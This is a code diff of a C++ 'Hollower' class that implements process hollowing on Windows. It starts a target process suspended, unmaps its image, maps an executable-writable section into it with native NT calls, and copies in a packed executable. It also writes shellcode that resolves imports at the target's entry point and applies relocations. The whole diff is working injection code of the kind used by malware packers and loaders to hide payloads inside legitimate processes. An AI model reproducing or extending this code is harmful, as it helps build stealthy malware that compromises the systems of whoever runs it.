@@ -1,11 +1,16 @@
 #include "stdafx.h"
 #include "Hollower.h"
 #include "Shellcode.h"
+#include "Reflections.h"
+
+#define STATUS_CONFLICTING_ADDRESSES 0xC0000018
+
 
 Hollower::Hollower(std::wstring targetProcPath, IMAGE_DOS_HEADER *unpackedExe)
 {
-	this->path = targetProcPath;
-	this->peData = new PEData(unpackedExe);
+	this->hollowedProcPath = targetProcPath;
+	this->packedPEData = new PEData(unpackedExe);
+	this->hollowedPEData = new PEData(targetProcPath);
 
 	HMODULE hmNtdll = GetModuleHandle(L"ntdll");
 
@@ -13,54 +18,51 @@ Hollower::Hollower(std::wstring targetProcPath, IMAGE_DOS_HEADER *unpackedExe)
 	this->NtMapViewOfSection = (TNtMapViewOfSection)GetProcAddress(hmNtdll, "NtMapViewOfSection");
 	this->NtCreateSection = (TNtCreateSection)GetProcAddress(hmNtdll, "NtCreateSection");
 	
-	//until we reach RET,0xcc,0xcc,0xcc
-	while (*(DWORD*)(&((BYTE*)ContainsString)[this->containsStringSize-4]) != 0xccccccc3)
-		this->containsStringSize++;
+	this->containsStringSize = GetFunctionSize(ContainsString);
+	this->IATshellcodeSize= GetFunctionSize(IATshellcode);
 
-	//until we reach RET,0xcc,0xcc,0xcc
-	while (*(DWORD*)(&((BYTE*)IATshellcode)[this->IATshellcodeSize-4]) != 0xccccccc3)
-		(BYTE)this->IATshellcodeSize++;
-
-	this->imageOffset = (void*)(this->containsStringSize + this->IATshellcodeSize + 0x1000);
-}
-
-__declspec(naked) void BootStrap(){
-	__asm {
-		pusha
-		//call IATshellcodeAddr
-		popa
-		//jump EP
-	}
+	
+	this->remoteBase = (void*)this->hollowedPEData->GetOptionalHeader()->ImageBase;
 }
 
 
 void Hollower::ReMapExe()
 {
 	//remote base addr should be same as local base addr since we are hollowing same process
-	this->NtUnmapViewOfSection(this->hProc, GetModuleHandle(NULL));
+	this->NtUnmapViewOfSection(this->hProc, (void*)this->hollowedPEData->GetOptionalHeader()->ImageBase);
 	HANDLE hSection;
 	LARGE_INTEGER sMaxSize = { 0, 0 };
-	sMaxSize.LowPart = this->peData->GetOptionalHeader()->SizeOfImage + (int)this->imageOffset;
+	sMaxSize.LowPart = this->packedPEData->GetOptionalHeader()->SizeOfImage > this->hollowedPEData->GetOptionalHeader()->SizeOfImage ? this->packedPEData->GetOptionalHeader()->SizeOfImage : this->hollowedPEData->GetOptionalHeader()->SizeOfImage;
 	NTSTATUS status = this->NtCreateSection(&hSection, SECTION_MAP_EXECUTE | SECTION_MAP_READ | SECTION_MAP_WRITE, NULL, &sMaxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
 
-	void *addr = this->peData->GetModuleBase();
+	void *addr = this->packedPEData->GetModuleBase();
 	void* loadedExeSection = NULL;
-	DWORD vSize = 0;
-	status = this->NtMapViewOfSection(hSection, (HANDLE)0xffffffff, &this->loadedExeSection, NULL, NULL, NULL, &vSize, 2, NULL, PAGE_EXECUTE_READWRITE);
+	SIZE_T vSize = 0;
+	this->NtMapViewOfSection(hSection, (HANDLE)0xffffffff, &this->localSectionBase, NULL, NULL, NULL, &vSize, 2, NULL, PAGE_EXECUTE_READWRITE);
 	status = this->NtMapViewOfSection(hSection, this->hProc, &this->remoteBase, NULL, NULL, NULL, &vSize, 2, NULL, PAGE_EXECUTE_READWRITE);
+	
+	//rebase - now requires a SetThreadContext call
+	if (status == STATUS_CONFLICTING_ADDRESSES)
+	{
+		this->remoteBase = NULL;
+		this->NtMapViewOfSection(hSection, this->hProc, &this->remoteBase, NULL, NULL, NULL, &vSize, 2, NULL, PAGE_EXECUTE_READWRITE);
+	}
 
-	std::vector<SectionInfo> sections = this->peData->GetSections();
+	this->imageOffset = (void*)(this->hollowedPEData->GetOptionalHeader()->AddressOfEntryPoint + this->IATshellcodeSize + 0x100);
+
+	std::vector<SectionInfo> sections = this->packedPEData->GetSections();
 
 	for (std::vector<SectionInfo>::iterator it = sections.begin(); it != sections.end(); ++it)
 	{
-		memcpy((void*)((int)this->loadedExeSection + (int)this->imageOffset + (int)it->_vOffset), (void*)((int)addr + it->_rOffset), it->_vSize);
+		memcpy((void*)((int)this->localSectionBase + (int)this->imageOffset + (int)it->_vOffset), (void*)((int)addr + it->_rOffset), it->_vSize);
 	}
+
 }
 
 size_t Hollower::SerializeIATInfo()
 {
 	/*
-	* SerializedIAT format
+	* SerializedIAT State Maching
 	* ---------------------
 	* NULL - delimit function
 	* NULL, NULL - delimit library (string after is always library name)
@@ -68,9 +70,9 @@ size_t Hollower::SerializeIATInfo()
 	*
 	*/
 
-	IAT iat = this->peData->GetIAT();
+	IAT iat = this->packedPEData->GetIAT();
 	//lead with two nulls
-	char* sectionPos = (char*)this->loadedExeSection+2;
+	char* sectionPos = (char*)this->localSectionBase+2;
 
 	for (std::vector<Thunk>::iterator it = iat.thunks.begin(); it != iat.thunks.end(); ++it)
 	{
@@ -84,13 +86,13 @@ size_t Hollower::SerializeIATInfo()
 		//add extra NULL for lib delimeter
 		sectionPos++;
 	}
-	return (size_t)((int)sectionPos - (int)this->loadedExeSection)+2;
+	return (size_t)((int)sectionPos - (int)this->localSectionBase)+2;
 }
 
-void Hollower::WriteIATStub(size_t IATCodeoffset)
+void Hollower::WriteIATInfo(size_t IATInfoOffset)
 {
-	int ContainsStringAddr = (int)this->loadedExeSection + IATCodeoffset;
-	
+	int ContainsStringAddr = (int)this->localSectionBase + IATInfoOffset;
+
 	//copy ContainsString Function
 	memcpy((void*)ContainsStringAddr, ContainsString, containsStringSize);
 
@@ -99,47 +101,59 @@ void Hollower::WriteIATStub(size_t IATCodeoffset)
 	lstrcpyW((wchar_t*)kernel32Str, L"KERNEL32.DLL");
 
 	int loadlibraryStr = kernel32Str + 0x20;
-	strcpy_s((char*)loadlibraryStr, sizeof("LoadLibraryA"),"LoadLibraryA");
+	strcpy_s((char*)loadlibraryStr, sizeof("LoadLibraryA"), "LoadLibraryA");
 
 	int getProcAddrStr = loadlibraryStr + 0x20;
-	strcpy_s((char*)getProcAddrStr,sizeof("GetProcAddress"), "GetProcAddress");
+	strcpy_s((char*)getProcAddrStr, sizeof("GetProcAddress"), "GetProcAddress");
 
-	int IATShellcodeAddr = (int)this->loadedExeSection + IATCodeoffset + this->containsStringSize+0x300;
+	//Our Shellcode EP should be lined up to EIP of the suspended process (AddressOfEntryPoint) - avoid SetThreadContext call :)
+	int IATBootstrapEP = (int)this->localSectionBase + (int)(this->hollowedPEData->GetOptionalHeader()->AddressOfEntryPoint);
+
 	//copy IATShellcode
-	memcpy((void*)IATShellcodeAddr, IATshellcode, this->IATshellcodeSize);
+	memcpy((void*)IATBootstrapEP, IATshellcode, this->IATshellcodeSize);
+	
+	//Apply settings to shellcodeEP
+	FindReplaceMemory((void*)IATBootstrapEP, 
+		(size_t)this->IATshellcodeSize, 
+		std::map<DWORD, DWORD>({
+								{ SECTION_BASE_PLACEHOLDER, (DWORD)this->remoteBase },
+								{ IAT_LOCATION_PLACEHOLDER, (DWORD)this->remoteBase + (DWORD)this->packedPEData->GetIAT().offset},
+								{ CONTAINS_STRING_PLACEHOLDER, (DWORD)this->remoteBase + IATInfoOffset },
+								{ KERNEL32_PLACEHOLDER, (DWORD)this->remoteBase + (kernel32Str - (int)this->localSectionBase) },
+								{ LOADLIBRARY_PLACEHOLDER,(DWORD)this->remoteBase + (loadlibraryStr - (int)this->localSectionBase)},
+								{ GETPROCADDRESS_PLACEHOLDER,(DWORD)this->remoteBase + (getProcAddrStr - (int)this->localSectionBase)},
+								{ OEP_PLACEHOLDER, (DWORD)this->remoteBase + (DWORD)this->imageOffset + this->packedPEData->GetEntryPoint() }
+								}));
 
+}
 
-	//Overwrite shellcode placeholders
-	while ((size_t)IATShellcodeAddr<(IATShellcodeAddr + this->IATshellcodeSize))
+void Hollower::FixRelocations()
+{
+	IMAGE_BASE_RELOCATION* relocationDirectory = (IMAGE_BASE_RELOCATION*)((int)this->localSectionBase + (int)this->imageOffset + (int)this->packedPEData->GetOptionalHeader()->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
+	int relocationSize = *(int*)((int)this->localSectionBase + (int)this->packedPEData->GetOptionalHeader()->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size);
+	int relPos = 0;
+	
+	while (relPos < relocationSize)
 	{
-		//IAT info addr (aka Section Base)
-		if (*(DWORD*)IATShellcodeAddr == SECTION_BASE_PLACEHOLDER) {
-			*(DWORD*)IATShellcodeAddr = (DWORD)this->remoteBase;
-		}
-		//IAT offset addr
-		else if (*(DWORD*)IATShellcodeAddr == IAT_LOCATION_PLACEHOLDER) {
-			*(DWORD*)IATShellcodeAddr = (DWORD)this->remoteBase+(DWORD)this->imageOffset + (DWORD)this->peData->GetIAT().offset;
-			
-		}
-		else if((*(DWORD*)IATShellcodeAddr == CONTAINS_STRING_PLACEHOLDER)) {
-			*(DWORD*)IATShellcodeAddr = (DWORD)this->remoteBase + IATCodeoffset;
-		}
-		else if (*(DWORD*)IATShellcodeAddr == KERNEL32_PLACEHOLDER) {
-			*(DWORD*)IATShellcodeAddr = (DWORD)this->remoteBase + (kernel32Str - (int)this->loadedExeSection);
+		DWORD majorOffset = (DWORD)relocationDirectory->VirtualAddress + relPos;
+		size_t blockSize = (DWORD)relocationDirectory->SizeOfBlock;
+		DWORD block = (DWORD)((DWORD*)relocationDirectory+2);
+		for (size_t i = relPos; i < blockSize / 4; i++)
+		{
+			BYTE minorOffset = *(BYTE*)block;
 
+			void* addrToBePatched = (IMAGE_BASE_RELOCATION*)((int)this->localSectionBase + (int)this->imageOffset + majorOffset + minorOffset);
+			*(DWORD*)addrToBePatched = (DWORD)(((*(int*)addrToBePatched) - (int)this->packedPEData->GetOptionalHeader()->ImageBase) + (int)this->remoteBase);
+			(WORD*)block++;
 		}
-		else if ((*(DWORD*)IATShellcodeAddr == LOADLIBRARY_PLACEHOLDER)) {
-			*(DWORD*)IATShellcodeAddr = (DWORD)this->remoteBase + (loadlibraryStr - (int)this->loadedExeSection);
-		}
-		else if ((*(DWORD*)IATShellcodeAddr == GETPROCADDRESS_PLACEHOLDER)) {
-			*(DWORD*)IATShellcodeAddr = (DWORD)this->remoteBase + (getProcAddrStr - (int)this->loadedExeSection);
-		}
-		else if ((*(DWORD*)IATShellcodeAddr == OEP_PLACEHOLDER)) {
-			*(DWORD*)IATShellcodeAddr = (DWORD)this->remoteBase + (DWORD)this->imageOffset + this->peData->GetEntryPoint();
-			break;
-		}
-		(BYTE*)IATShellcodeAddr++;
+		relPos += blockSize;
 	}
+}
+
+void Hollower::InjectBootstrapCode(size_t IATInfoOffset)
+{
+	WriteIATInfo(IATInfoOffset);
+	FixRelocations();
 
 }
 
@@ -150,9 +164,10 @@ HANDLE Hollower::DoHollow()
 	//Create section objects and map binary into remote process
 	ReMapExe();
 	//Serialize IAT info into remote section object
-	size_t offset = SerializeIATInfo();
+	size_t IATInfoOffset = SerializeIATInfo();
 	//Write IAT stub which will process serialized IAT info
-	WriteIATStub(offset);
+	InjectBootstrapCode(IATInfoOffset);
+
 	return this->hProc;
 }
 
@@ -164,8 +179,11 @@ void Hollower::CreateSuspendedProcess()
 	memset(&si, 0, sizeof(si));
 
 	si.cb = sizeof(STARTUPINFO);
+	wchar_t* app = (wchar_t*)malloc(hollowedProcPath.length()*sizeof(wchar_t));
 
-	CreateProcess(path.c_str(), NULL, NULL, NULL, false, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
+	lstrcpyW(app, hollowedProcPath.c_str());
+
+	CreateProcess(app, NULL , NULL, NULL, false, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
 	
 	this->hProc = pi.hProcess;
 }
